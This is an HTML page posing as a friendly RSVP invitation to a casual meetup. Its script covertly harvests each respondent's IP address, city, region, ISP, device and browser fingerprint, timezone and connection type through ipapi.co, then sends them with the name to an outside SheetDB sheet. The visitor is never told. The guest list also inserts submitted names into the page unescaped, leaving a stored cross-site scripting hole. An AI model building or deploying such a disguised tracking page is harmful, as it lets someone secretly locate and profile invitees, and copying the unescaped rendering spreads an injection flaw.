<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casual Meetup Invitation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #001a4d 0%, #0d3b8a 50%, #1e5ab8 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            max-width: 1200px;
            width: 100%;
        }

        @media (max-width: 968px) {
            .container {
                grid-template-columns: 1fr;
            }
        }

        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 26, 77, 0.3);
            border: 1px solid #e0eeff;
        }

        .invitation-card {
            padding: 45px 35px;
            text-align: center;
        }

        h1 { color: #0d3b8a; font-size: 38px; margin-bottom: 8px; font-weight: 800; }
        .subtitle { color: #1e5ab8; font-size: 18px; margin-bottom: 35px; font-style: italic; }

        .details {
            background: linear-gradient(135deg, #f0f4ff 0%, #e8eeff 100%);
            border-left: 5px solid #2563eb;
            padding: 20px;
            margin: 25px 0;
            border-radius: 12px;
            text-align: left;
        }

        .detail-item { margin: 10px 0; font-size: 16px; color: #001a4d; }
        .detail-label { font-weight: 700; color: #0d3b8a; }

        .form-group { text-align: left; margin-bottom: 14px; }
        label { display: block; font-weight: 600; color: #0d3b8a; margin-bottom: 6px; font-size: 14px; }

        input, select {
            width: 100%;
            padding: 11px;
            border: 2px solid #d0deff;
            border-radius: 10px;
            font-size: 15px;
            outline: none;
            transition: border 0.3s;
        }

        input:focus, select:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .cta-button {
            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
            color: white; border: none; padding: 14px 30px; font-size: 16px;
            font-weight: 700; border-radius: 10px; cursor: pointer;
            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
            width: 100%;
            margin-top: 15px;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .cta-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 28px rgba(37, 99, 235, 0.4);
        }

        .cta-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .guest-list-section {
            padding: 40px 35px;
        }

        .section-title {
            color: #0d3b8a;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .guest-card {
            background: linear-gradient(135deg, #f8faff 0%, #f0f4ff 100%);
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #e0eeff;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .guest-card:hover {
            transform: translateX(5px);
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.15);
        }

        .guest-info {
            flex: 1;
        }

        .guest-name {
            font-weight: 700;
            color: #0d3b8a;
            font-size: 15px;
            margin-bottom: 4px;
        }

        .guest-device {
            font-size: 12px;
            color: #666;
        }

        .status-badge {
            font-size: 11px;
            font-weight: 800;
            text-transform: uppercase;
            padding: 6px 14px;
            border-radius: 20px;
            white-space: nowrap;
            margin-left: 10px;
        }

        .coming { background: #dcfce7; color: #166534; }
        .not-coming { background: #fee2e2; color: #991b1b; }

        .empty-state {
            text-align: center;
            color: #999;
            padding: 30px;
            font-size: 14px;
        }

        .counter {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            justify-content: space-around;
        }

        .counter-item {
            background: linear-gradient(135deg, #f0f4ff 0%, #e8eeff 100%);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #d0deff;
            flex: 1;
            text-align: center;
        }

        .counter-number {
            font-size: 28px;
            font-weight: 800;
            color: #2563eb;
            margin-bottom: 5px;
        }

        .counter-label {
            font-size: 12px;
            color: #0d3b8a;
            font-weight: 600;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card invitation-card">
            <h1>üëãHi Are you free?</h1>
            <p class="subtitle">Casual Meetup</p>

            <div class="details">
                <div class="detail-item"><span class="detail-label">üìÖ Date & Time:</span> Jan 21, 2026</div>
                <div class="detail-item"><span class="detail-label">üìç Location:</span> Guntur</div>
                <div class="detail-item"><span class="detail-label">üéâ Event:</span> Casual Hangout </div>
            </div>

            <form id="rsvpForm" onsubmit="handleRSVP(event)">
                <div class="form-group">
                    <label>Your Name</label>
                    <input type="text" id="name" required placeholder="Enter your name">
                </div>
                <div class="form-group">
                    <label>Are you joining us?</label>
                    <select id="status">
                        <option value="coming">‚úÖ Yes, I'm coming!</option>
                        <option value="not-coming">‚ùå Sorry, can't make it</option>
                    </select>
                </div>
                <button type="submit" class="cta-button" id="submitBtn">Confirm Attendance</button>
            </form>
        </div>

        <div class="card guest-list-section">
            <div class="section-title">üë• Guest List</div>
            <div class="counter">
                <div class="counter-item">
                    <div class="counter-number" id="totalCount">0</div>
                    <div class="counter-label">Total RSVPs</div>
                </div>
                <div class="counter-item">
                    <div class="counter-number" id="comingCount">0</div>
                    <div class="counter-label">Coming</div>
                </div>
                <div class="counter-item">
                    <div class="counter-number" id="notComingCount">0</div>
                    <div class="counter-label">Not Coming</div>
                </div>
            </div>
            <div id="attendeesList">
                <div class="empty-state">Loading guest list...</div>
            </div>
        </div>
    </div>

    <script>
        const SHEETDB_API = 'https://sheetdb.io/api/v1/raj5uy3ex9q9l';

        // Comprehensive device & browser detection
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            
            if (/Chrome/.test(ua) && !/Chromium/.test(ua)) browser = "Chrome";
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
            else if (/Firefox/.test(ua)) browser = "Firefox";
            else if (/Edge/.test(ua) || /Edg/.test(ua)) browser = "Edge";
            
            return browser;
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return "Windows";
            if (/Mac/.test(ua)) return "macOS";
            if (/Linux/.test(ua)) return "Linux";
            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
            if (/Android/.test(ua)) return "Android";
            return "Unknown";
        }

        function getDevice() {
            const ua = navigator.userAgent;
            const isIPad = /iPad|Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
            if (isIPad) return "iPad";
            if (/iPhone/.test(ua)) return "iPhone";
            if (/Android/.test(ua)) return "Android Device";
            if (/Windows/.test(ua)) return "Windows PC";
            if (/Mac/.test(ua) && !isIPad) return "Mac";
            return "Unknown Device";
        }

        function getConnectionType() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return connection ? connection.effectiveType : "Unknown";
        }

        function getLanguage() {
            return navigator.language || navigator.userLanguage;
        }

        function getTimezone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        async function handleRSVP(event) {
            event.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            let geoData = { city: "Private", region: "Unknown", org: "Unknown", ip: "Private" };
            try {
                const response = await fetch('https://ipapi.co/json/');
                geoData = await response.json();
            } catch (e) {}

            const data = {
                Name: document.getElementById('name').value,
                Status: document.getElementById('status').value,
                Device: getDevice(),
                Browser: getBrowserInfo(),
                OS: getOS(),
                ScreenResolution: `${window.screen.width}x${window.screen.height}`,
                ColorDepth: `${window.screen.colorDepth}-bit`,
                City: geoData.city,
                Region: geoData.region,
                Country: geoData.country_name || "Unknown",
                ISP: geoData.org,
                IP: geoData.ip,
                Timezone: getTimezone(),
                Language: getLanguage(),
                ConnectionType: getConnectionType(),
                IsMobile: navigator.userAgentData?.mobile ? "Yes" : "No",
                Timestamp: new Date().toLocaleString(),
                UTC_Time: new Date().toISOString()
            };

            try {
                await fetch(SHEETDB_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: [data] })
                });
                alert("‚úÖ RSVP Submitted! See you at the meetup! üéâ");
                setTimeout(() => location.reload(), 500);
            } catch (error) {
                alert("Error submitting RSVP. Please try again.");
                btn.innerText = "Confirm Attendance";
                btn.disabled = false;
            }
        }

        function loadGuests() {
            fetch(SHEETDB_API)
                .then(res => res.json())
                .then(data => {
                    const list = document.getElementById('attendeesList');
                    const totalCount = document.getElementById('totalCount');
                    const comingCount = document.getElementById('comingCount');
                    const notComingCount = document.getElementById('notComingCount');
                    
                    if (!data.length) { 
                        list.innerHTML = '<div class="empty-state">No RSVPs yet. Be the first to respond! üëá</div>';
                        return;
                    }
                    
                    const coming = data.filter(g => g.Status === 'coming').length;
                    const notComing = data.filter(g => g.Status === 'not-coming').length;
                    
                    totalCount.textContent = data.length;
                    comingCount.textContent = coming;
                    notComingCount.textContent = notComing;
                    
                    list.innerHTML = data.map(g => `
                        <div class="guest-card">
                            <div class="guest-info">
                                <div class="guest-name">${g.Name}</div>
                                <div class="guest-device">${g.Device || 'Unknown'} ‚Ä¢ ${g.Browser || 'Unknown'}</div>
                            </div>
                            <span class="status-badge ${g.Status}">${g.Status === 'coming' ? '‚úÖ Coming' : '‚ùå Not Coming'}</span>
                        </div>
                    `).join('');
                })
                .catch(error => {
                    console.error('Error loading guests:', error);
                    document.getElementById('attendeesList').innerHTML = '<div class="empty-state">Unable to load guest list</div>';
                });
        }

        window.onload = loadGuests;
        // Refresh guest list every 5 seconds
        setInterval(loadGuests, 5000);
    </script>
</body>
</html>
